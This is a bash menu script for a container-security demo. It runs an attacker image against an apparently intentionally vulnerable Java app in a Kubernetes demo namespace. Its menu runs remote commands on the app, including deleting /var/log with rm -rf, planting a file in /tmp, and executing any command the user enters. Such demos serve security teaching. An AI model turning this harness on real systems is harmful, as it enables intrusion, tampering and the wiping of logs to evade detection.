#!/bin/bash
# Bash Menu Script Example

# Fetch victim URL using kubectl
URL="http://$(kubectl get svc -n demo --selector=app=java-goof -o jsonpath='{.items[*].status.loadBalancer.ingress[0].hostname}')"

# Set color green for echo output
green=$(tput setaf 2)

PS3='Select the attack: '
options=("whoami" "list services and processes" "delete logs" "write a file" "custom command" "destroy application" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "whoami")
            echo "💬${green}Showing what users is running the application..."
            kubectl run -n attacker attacker-$RANDOM --rm -i --tty --image raphabot/container-sec-attacker "$URL" "whoami"
            ;;
        "list services and processes")
            echo "💬${green}Showing running services and processes..."
            kubectl run -n attacker attacker-$RANDOM --rm -i --tty --image raphabot/container-sec-attacker "$URL" "service  --status-all && ps -aux"
            ;;
        "delete logs")
            echo "💬${green}Showing current log files..."
            kubectl run -n attacker attacker-$RANDOM --rm -i --tty --image raphabot/container-sec-attacker "$URL" "ls -lah /var/log"
            echo "💬${green}Deleting the log folder..."
            kubectl run -n attacker attacker-$RANDOM --rm -i --tty --image raphabot/container-sec-attacker "$URL" "rm -rf /var/log"
            echo "💬${green}Showing the log folder was deleted..."
            kubectl run -n attacker attacker-$RANDOM --rm -i --tty --image raphabot/container-sec-attacker "$URL" "ls -lah /var/log"
            ;;

        "write a file")
            echo "💬${green}Showing current files..."
            kubectl run -n attacker attacker-$RANDOM --rm -i --tty --image raphabot/container-sec-attacker "$URL" "ls -lah /tmp"
            echo "💬${green}Create a new file..."
            kubectl run -n attacker attacker-$RANDOM --rm -i --tty --image raphabot/container-sec-attacker "$URL" "touch /tmp/TREND_HAS_BEEN_HERE"
            echo "💬${green}Showing files again..."
            kubectl run -n attacker attacker-$RANDOM --rm -i --tty --image raphabot/container-sec-attacker "$URL" "ls -lah /tmp"
            ;;
        "custom command")
            echo "💬${green}Enter command:"
            read -r USER_COMMAND
            kubectl run -n attacker attacker-$RANDOM --rm -i --tty --image raphabot/container-sec-attacker "$URL" "${USER_COMMAND}"
            ;;
        "destroy application")
            echo "💬${green}TODO"
            ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done